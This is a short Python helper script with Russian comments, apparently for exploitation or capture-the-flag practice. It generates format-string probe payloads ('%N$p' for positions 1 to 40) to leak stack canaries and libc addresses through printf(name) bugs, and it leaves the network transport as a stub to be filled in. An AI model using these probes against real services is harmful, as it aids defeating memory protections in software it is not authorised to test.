#!/usr/bin/env python3
"""
fmt_leak_helper.py — быстрый скан позиций формат-строки (%N$p).
Полезно для поиска canary/libc-адресов в printf(name)-уязвимостях.
Использование:
    python fmt_leak_helper.py  # локальный тест: ввод 'А'*30
    # в remote-сценарии: отправлять %N$p (1..40) и смотреть ответ.
"""

import sys


def scan_positions(limit=40, payload_fmt="%{}$p"):
    """Возвращает список (N, значение) при ручном/автоматическом запросе."""
    results = []
    for n in range(1, limit + 1):
        token = payload_fmt.format(n).encode()
        # здесь ваш транспорт: recv_until(prompt), sendline(token), recv_clean()
        # для примера просто выводим токен — подставьте свой вызов.
        results.append((n, token))
    return results


if __name__ == "__main__":
    for n, tok in scan_positions(int(sys.argv[1]) if len(sys.argv) > 1 else 40):
        print(f"%{n}$p -> {tok.decode()}")
    print("Подставьте реальный транспорт (recv/send) вместо примера.")
